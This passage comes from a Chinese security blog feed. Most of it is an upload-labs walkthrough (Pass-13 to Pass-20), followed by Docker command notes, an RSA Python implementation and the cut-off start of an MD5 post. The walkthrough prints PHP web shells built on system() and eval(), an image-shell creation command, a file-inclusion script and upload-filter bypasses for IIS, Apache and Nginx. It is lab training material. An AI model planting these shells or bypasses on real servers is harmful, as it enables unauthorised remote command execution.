class="string">"."</span>.$file_ext;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcP5d.png" alt="kJcP5d.png"></p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>从这一关开始要求上传图片马，但是没有办法直接执行图片马，需要另外的方法去实现一般是加上php伪协议去getshell，常见的有phar，zip等等<br>如果想要看到详细的效果可以写一下简单的脚本放在upload目录下即可，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">include</span> $_GET[file];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最最最简单的图片马直接一条命令即可生成</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg /b + shell.php /a webshell.jpg</span><br></pre></td></tr></table></figure><p>上传一个图片马，内容如下，可以看到里面有脚本语言</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcYrT.png" alt="kJcYrT.png"></p><p>把该图片上传上去，尝试文件包含，成功回显</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcaa4.png" alt="kJcaa4.png"></p><p>这里可以发现源代码只是用了unpack这一个函数去实现对于php前两个字节的检测，也就是只是对文件头做检测。。。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);</span><br></pre></td></tr></table></figure><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>类似上一个题目,获取了图片的相关的大小及类型，并验证是否时刻上传的图片，同样可以使用文件头的方式绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br><span class="line">$ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJchid.png" alt="kJchid.png"></p><p>说明info[2]是一个文件的类型，同样的方法也是可以绕过的</p><p><img src="https://s2.ax1x.com/2019/02/04/kJcrxx.png" alt="kJcrxx.png"></p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>换了一个获取图片信息的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJcLdg.png" alt="kJcLdg.png"></p><p>跟pass-13一样的绕过方法</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这一关对后缀名和文件类型啥的都进行了很严格的控制，而且在后面还对图片进行了二次编译</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">$im = imagecreatefromjpeg($target_path);</span><br></pre></td></tr></table></figure><p>这一个题目跟上次校赛的题目思路一致，寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传，下载下来后发现这一部分插入代码的没变但是其他部分都变了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgrkQ.png" alt="kJgrkQ.png"></p><p>尝试文件包含，后面怎么利用就不多说了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJgq6x.png" alt="kJgq6x.png"></p><h3 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h3><p>这一关是条件竞争的问题，查看源代码就会发现你需要在缓存文件转移到别的目录的时候，赶紧访问它，这里可以使用burp去发包，可以把文件内容改成下面这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $c=fopen(<span class="string">'./cmd.php'</span>,<span class="string">'w'</span>);fwrite($c,<span class="string">'&lt;?php system($_GET["f"]);?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者这样，反正就是为了写文件进去就对了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[cmd]?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/04/kJ2d3R.png" alt="kJ2d3R.png"></p><p>两个burp跑一跑，就会在该文件夹下面产生新的文件了</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2Du6.png" alt="kJ2Du6.png"></p><p>访问成功</p><p><img src="https://s2.ax1x.com/2019/02/04/kJ2W8A.png" alt="kJ2W8A.png"></p><h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p>同样的也是一个条件竞争的问题，看一下源代码可以发现这里使用类去实现相关方法，包括查看文件后缀名，大小等等</p><p>这里面的问题存在于代码将上传文件更改名字的时候给了个时间差，让我们可以去实现这个竞争效果，同样的方法，不都说</p><h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>这一关正常做法应该是CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称</p><p>上传的文件名用0x00绕过。改成<code>xx.php【二进制00】.x.jpg</code></p><p>但是发现了一种更有意思的解法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pupiles.com/%E7%94%B1%E4%B8%80%E9%81%93ctf%E9%A2%98%E5%BC%95%E5%8F%91%E7%9A%84%E6%80%9D%E8%80%83.html</span><br></pre></td></tr></table></figure><p>简单来说就是<code>move_uploaded_file</code>底层会调用<code>tsrm_realpath</code>函数导致，递归删除文件名最后的<code>/.</code>导致绕过了后缀名检测，同样类似的函数还有<code>file_put_content()</code>，反正打开文件流都会有类似的操作</p><p>所以可以这样子去绕过<code>6.php/.</code></p><p><img src="https://s2.ax1x.com/2019/02/05/kJTg56.png" alt="kJTg56.png"></p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>这个题目用了数组+/.的方式去绕过，因为源代码里面含有这样的两句代码，成了关键得绕过的地方</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">                    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>这同样我们就需要满足两个条件，第一个是先得保证另外修改的名字需要满足是数组的条件，所以我们可以抓包构造数组，第二点由于后面filename构成的过程中由于<code>$file[count($file) - 1]</code>的作用，导致<code>$file[1] = NULL</code>，所以构造文件名后相当于直接就是<code>xx.php/.</code>，根据上面一题的知识，可以直接在<code>move_uploaded_file</code>函数的作用下可以将<code>/.</code>忽略，因此还是可以上传成功的。</p><p>因此save_name变量的两个值分别是<code>xx.php/</code>，另外一个值是<code>jpg</code>，其实从代码审计的角度上看，还是可控变量导致这样的后果</p><p><img src="https://s2.ax1x.com/2019/02/13/k0OSM9.png" alt="k0OSM9.png"></p><p><img src="https://s2.ax1x.com/2019/02/13/k0O9q1.png" alt="k0O9q1.png"></p><h3 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h3><p>upload-labs里面的关卡个人感觉只是针对文件上传这个漏洞去弄的，可以梳理一下，可以根据上面的绕过写一个fuzz字典XD</p><ol><li>前端的绕过</li><li>后缀名，文件类型，文件头的绕过</li><li>Windows下::$DATA的问题</li><li>图片经过二次渲染的绕过</li><li>根据代码跳进进行的绕过</li><li>条件竞争</li></ol><p>还有其他的中间件问题导致的解析漏洞没有展现出来，可能环境配置比较麻烦，想了很久，我怕自己忘了，还是自己总结一下，以后可以拿出来看一下</p><h4 id="IIS-6-0"><a href="#IIS-6-0" class="headerlink" title="IIS 6.0"></a>IIS 6.0</h4><p><code>IIS 6.0</code>解析利用方法有三种：<br>1.目录解析<br>建立xx.asp为名称的<code>文件夹</code>，将asp文件放入，访问/xx.asp/xx.jpg，其中xx.jpg可以为任意文件后缀，即可解析<br>2.文件解析<br>后缀解析：/xx.asp;.jpg    /xx.asp:.jpg(此处需抓包修改文件名)<br>3.默认解析<br>IIS6.0 默认的可执行文件除了asp还包含这三种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/xxx.asa</span><br><span class="line">/xxx.cer</span><br><span class="line">/xxx.cdx</span><br><span class="line">/xxx.apsx</span><br></pre></td></tr></table></figure><h4 id="IIS-7-0-7-5"><a href="#IIS-7-0-7-5" class="headerlink" title="IIS 7.0/7.5"></a>IIS 7.0/7.5</h4><p>在正常图片URL后添加 /.php，可以解析为php</p><h4 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h4><p>一般都在2.3.x以下版本，但是有时候配置文件的不同也会导致不安全</p><p>后缀解析：test.php.x1.x2.x3<br>Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析<br>test.php.x1.x2.x3则会被解析为php</p><p>最近在出题的时候在apache 2.1.x的版本就可以用test.php.jpg直接就可以getshell了，真尴尬。</p><h4 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h4><p>Nginx &lt;<code>8.03</code>畸形解析漏洞<br>直接在正常图片URL后添加<code>/.php</code><br>Nginx &lt;=<code>0.8.37</code><br>在Fast-CGI<code>关闭</code>的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞</p><p>在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;闲来无聊，把upload-labs所有的关卡都刷一遍
    
    </summary>
    
      <category term="文件上传" scheme="0verwatch.top/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
      <category term="文件上传" scheme="0verwatch.top/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Dockerfile编写</title>
    <link href="0verwatch.top/Dockerfile-writing.html"/>
    <id>0verwatch.top/Dockerfile-writing.html</id>
    <published>2019-01-22T06:47:05.000Z</published>
    <updated>2019-02-08T10:15:33.598Z</updated>
    
    <content type="html"><![CDATA[<p>最近在出题目，Dockerfile有些东西忘记了<a id="more"></a>，重新回顾一下</p><h4 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h4><p>新建并启动容器：docker run [opotions] IMAGE [COMMAND] [Args..]</p><p>-i : 交互式运行并且与-t相互运行</p><p>-t ：新建一个终端</p><p>–name：直接跟新建的名字</p><p>docker ps:查看所有正在运行的容器 -a查看历史运行过的容器 -l 上次运行的 -n 加个数字显示最近几次创建的容器 -q 显示容器编号  可以以此删除容器</p><p>退出容器：两种：1. exit  容器停止退出 2. ctrl+P+Q  容器不停止并退出</p><p>启动容器：docker start 容器ID</p><p>重启容器： docker restart 容器ID</p><p>停止容器： docker stop 容器ID或名字</p><p>强制停止容器：docker kill 容器ID或名字</p><p>删除已经停止的容器：docker rm 容器ID或名字 没有停止的加个 -f</p><p>删除全部 docker rm -f  $(docker ps -aq)</p><p>-P：随机端口映射</p><p>-p：指定端口映射，有以下四种格式</p><p>ip:hostPort:containerPort</p><p>ip:containerPort</p><p>hostPort:containerPort</p><p>contarinerPort</p><p>启动守护容器： -d 后台运行并返回ID</p><p>但是用这种方案启动的docker使用ps命令是看不到其容器进程，因为他已经退出了，Docker后台运行就必须有一个前台进程，如果不是那些一直挂气的命令如(top,tail)，就是会自动启动的</p><p>查看容器日志 docker logs -f -t –tail 容器ID -t时间戳 -f跟随最新日志打印 –tail跟数字表示最后几条</p><p>查看容器内进程：docker top 容器名字、ID</p><p>查看容器内部的细节：docker inspect 容器ID</p><p>进入正在运行的容器： docker exec -it 容器ID /bin/bash（好像一定要写，试了一下，不写进不去，写不写都可以，也可以是其他命令，则输出命令显示的结果） </p><p>或者是docker attach 容器ID，对比一下可以知道exec功能更多</p><p>从容器内拷贝文件到主机上：docker cp 容器ID:容器里面的路径 主机本地路径(可以改一下名字)</p><h4 id="Docker镜像"><a href="#Docker镜像" class="headerlink" title="Docker镜像"></a>Docker镜像</h4><p>是什么？联合文件系统   最大好处 ？共享资源</p><p>正常的命令就不说了，看文档就可以。</p><p>docker commit 提交容器副本使之成为一个新的镜像</p><p>docker commit -m 提交描述的信息 -a 作者 容器ID  要创建的目标镜像名：[标签名]</p><p>说明可反着来</p><h5 id="容器数据卷"><a href="#容器数据卷" class="headerlink" title="容器数据卷"></a>容器数据卷</h5><p>直接命令添加 ：docker run -it -v  /宿主机绝对路径目录:/容器内目录 镜像名</p><p>容器和宿主机之间数据共享</p><p>带权限的docker run -it -v  /宿主机绝对路径目录:/容器内目录:ro 镜像名</p><p>Dockerfile添加</p><p>可在Dockerfile中使用VOLUMN指令来给镜像添加一个或多个数据卷</p><p>新建一个Dockerfile然后通过build运行新建镜像</p><p>docker build -f  文件路径 -t  自己的名字空间/centos  .</p><p>要找默认地址用inspect命令查看</p><p>容器数据共享 –volumns-from 各自添加都能共享，而且注意一下这点，数据卷的生命周期一直到没有容器使用它为止</p><h4 id="Dockerfile解析"><a href="#Dockerfile解析" class="headerlink" title="Dockerfile解析"></a>Dockerfile解析</h4><p>每条保留字指令并且后面至少一个参数，而且是从上往下顺序执行，#表示注释</p><p>每条指令都会创建新的镜像层，并对镜像进行提交</p><p>保留字指令</p><p>FROM 基础镜像 </p><p>MAINTAINER 镜像维护者的姓名和邮箱</p><p>RUN 容器构建时需要运行的命令</p><p>EXPOSE 当前容器对外暴露的端口号</p><p>WORKDIR 指定创建容器后，终端默认登录进来的工作目录，一个落脚点</p><p>ENV 用来在构建镜像过程中设置环境变量</p><p>ADD 将宿主机目录下的文件拷贝进京向且ADD命令会自动处理URL和解压tar包</p><p>COPY 类似ADD拷贝文件和目录到镜像中1.COPY src dest 2.COPY [“src”,”dest”]</p><p>VOLUME 容器数据卷，用于保存数据</p><p>CMD 可以有多个命令，但会被docker run之后替换最后一个命令，而且不能追加某个命令的选项</p><p>ENTRYPOINT 跟CMD类似，但是可以追加。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在出题目，Dockerfile有些东西忘记了
    
    </summary>
    
      <category term="环境部署" scheme="0verwatch.top/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="环境部署" scheme="0verwatch.top/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>RSA原理及Python实现</title>
    <link href="0verwatch.top/RSA-python.html"/>
    <id>0verwatch.top/RSA-python.html</id>
    <published>2019-01-12T08:46:30.000Z</published>
    <updated>2019-01-12T08:47:31.177Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>RSA是第一个安全，实用的公钥加密算法，已成为国家标准，是目前应用广泛的公钥加密体制，RSA的基础是数论的欧拉定理<a id="more"></a>，它的安全性依赖于大整数因子分解的困难性，因为加解密次序可换，可用于加解密，可用于设计数字签名体制。</p><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><ol><li>选取两个安全的大素数p和q(其长度要足够长至少要是1024位)</li><li>计算乘积n = p <em> q, 计算phi(n) = (p-1)</em>(q-1)，其中phi(n)为n的欧拉函数</li><li>随机选取整数e，作为公钥，要求满足gcd(e, phi(n)) =1 ,即e与phi(n)互素</li><li>用扩展欧几里得算法计算私钥d。满足d * e=1(mod phi(n))，e和n是公钥，d是秘钥。 </li></ol><p>我的代码是固定了公钥为65537，产生的两个大素数是通过Miller-Rabin算法进行塑素性检测并且产生素数p还有q。</p><h3 id="核心代码及分析"><a href="#核心代码及分析" class="headerlink" title="核心代码及分析"></a>核心代码及分析</h3><p>首先是先产生两个大素数p和q，这里的核心代码是下面的代码，这里是根据消息的长度去产生p和q，怎么知道这两大数是个素数呢？就得通过Miller-Rabin概率素数测试算法，先判断一次费马小定理，满足的话就有可能是一个素数，然后再经过5次的Miller-Rabin素性测试，这样就可以很大概率说明其是素数，两次调用这样的过程就可以产生p和q。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#辗转相除法求最大公因数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a &gt; b: a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    判断一个数是否为素数</span></span><br><span class="line"><span class="string">    厄拉托塞师除法 </span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>, int(math.sqrt(n)) + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> n % i== <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#开始选择p q</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_prime</span><span class="params">(half_len)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        n = random.randint(<span class="number">0</span>, <span class="number">1</span> &lt;&lt; half_len)<span class="comment">#求2^half_len之间的大数</span></span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            found = <span class="keyword">True</span></span><br><span class="line">            <span class="comment"># 随机性测试</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">5</span>):   <span class="comment">#5的时候错误率已经小于千分之一</span></span><br><span class="line">                <span class="keyword">if</span> prime_test(n) == <span class="keyword">False</span>:</span><br><span class="line">                    found = <span class="keyword">False</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> found == <span class="keyword">True</span>:</span><br><span class="line">                <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"><span class="comment">#Miller-Rabin</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prime_test</span><span class="params">(n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        测试n是否为素数</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        q = n - <span class="number">1</span></span><br><span class="line">        k = <span class="number">0</span></span><br><span class="line">        <span class="comment"># 寻找k,q 是否满足2^k*q =n - 1</span></span><br><span class="line">        <span class="keyword">while</span> q % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">            q = q // <span class="number">2</span></span><br><span class="line">        a = random.randint(<span class="number">2</span>, n - <span class="number">2</span>)</span><br><span class="line">        <span class="comment"># 如果 a^q mod n= 1, n 可能是一个素数</span></span><br><span class="line">        <span class="keyword">if</span> fast_mod(a, q, n) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># 如果存在j满足 a ^ ((2 ^ j) * q) mod n == n-1, n 可能是一个素数</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, k):</span><br><span class="line">            <span class="keyword">if</span> fast_mod(a, (<span class="number">2</span> ** j) * q, n) == n - <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">        <span class="comment"># n 不是素数</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br></pre></td></tr></table></figure><p>因为是固定好公钥e=65537的，所以下一步的关键就是要实现通过扩展欧几里得算法去求出私钥d，这里面的关键代码如下，先是求出phi(n)然后就通过扩展欧几里得算法求出私钥d，然扩展欧几里的算法使用了递归的方法去实现，但是产生的私钥d有可能是一个负数，你得对其进行处理，最后产生一个大于零的私钥。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_key</span><span class="params">(key_len)</span>:</span> <span class="comment">#key_len要比消息长度大</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    生成n, e, d</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    p = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    q = random_prime(key_len // <span class="number">2</span>)</span><br><span class="line">    n  = p * q</span><br><span class="line">    ph_n = (p <span class="number">-1</span>) * (q <span class="number">-1</span>)</span><br><span class="line">    print(<span class="string">"ph_n:"</span>+str(ph_n))</span><br><span class="line">    e = <span class="number">65537</span> <span class="comment">#e取固定值</span></span><br><span class="line">    d = generate_d(ph_n, e)</span><br><span class="line">    <span class="keyword">return</span> (n ,e, d)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">ext_gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = ext_gcd(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line">        </span><br><span class="line">   <span class="comment">#产生秘钥d</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_d</span><span class="params">(ph_n, e)</span>:</span></span><br><span class="line">    (x, y, r) = ext_gcd(ph_n, e)</span><br><span class="line">    <span class="comment"># y maybe &lt; 0, so convert it</span></span><br><span class="line">    <span class="keyword">if</span> y &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment">#return y % ph_n</span></span><br><span class="line">        <span class="keyword">return</span> y + ph_n  <span class="comment">#直接用加法效率高一丢丢</span></span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><p>在执行运算的时候使用了一个快速幂的方法，这个方法可以将数值大一点的数简化其模幂运算的过程，代码如下，当然这样的过程也可以使用python里面的pow函数去实现。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_mod</span><span class="params">(b, n, m)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    快速幂</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    ret = <span class="number">1</span></span><br><span class="line">    tmp = b</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">0x1</span>:</span><br><span class="line">            ret = ret * tmp % m</span><br><span class="line">        tmp = tmp * tmp % m</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br></pre></td></tr></table></figure><h3 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h3><p>以”helloworldaaa”为例能够正确加解密并且输出加解密的公钥以及私钥。</p><p><a href="https://imgchr.com/i/F5RHAO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/01/02/F5RHAO.png" alt="F5RHAO.png"></a></p><h3 id="详细代码-放在github上了-：RSA加解密"><a href="#详细代码-放在github上了-：RSA加解密" class="headerlink" title="详细代码(放在github上了)：RSA加解密"></a>详细代码(放在github上了)：<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">RSA加解密</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;RSA是第一个安全，实用的公钥加密算法，已成为国家标准，是目前应用广泛的公钥加密体制，RSA的基础是数论的欧拉定理
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>MD5原理及Python实现</title>
    <link href="0verwatch.top/MD5-python.html"/>
    <id>0verwatch.top/MD5-python.html</id>
    <published>2019-01-12T08:32:37.000Z</published>
    <updated>2019-01-12T08:33:25.484Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>MD5消息摘要算法一种被广泛使用的密码散列函数，输入长度小于2^64比特的消息，我的代码也是以小于2^64比特的消息为例，输出一个128位（16字节）的散列值<a id="more"></a>（hash value），输入信息以512比特的分组为单位处理。</p><h3 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h3><ol><li>附加位填充</li><li>初始化链接变量</li><li>分组处理</li><li>步函数的运算</li></ol><p>这个流程描述下来非常符合hash函数的一般模型：</p><p><img src="https://s1.ax1x.com/2018/12/25/FgKNgH.png" alt="FgKNgH.png"></p><p>单个点拿出来仔细分析</p><h4 id="附加位填充"><a href="#附加位填充" class="headerlink" title="附加位填充"></a>附加位填充</h4><p>填充一个1和若干个0使消息长度模512与448同余，也就说剩余消息(此处的消息长度已经不满512位了)的最后512比特分组里面加上这一对填充的东西长度应该是448，还剩下64位是消息的长度，满足L mod 2^64,下图就很清楚解释了这一过程：</p><p><img src="https://s1.ax1x.com/2018/12/25/Fgu4hD.png" alt="Fgu4hD.png"></p><p>关键代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">length = struct.pack(<span 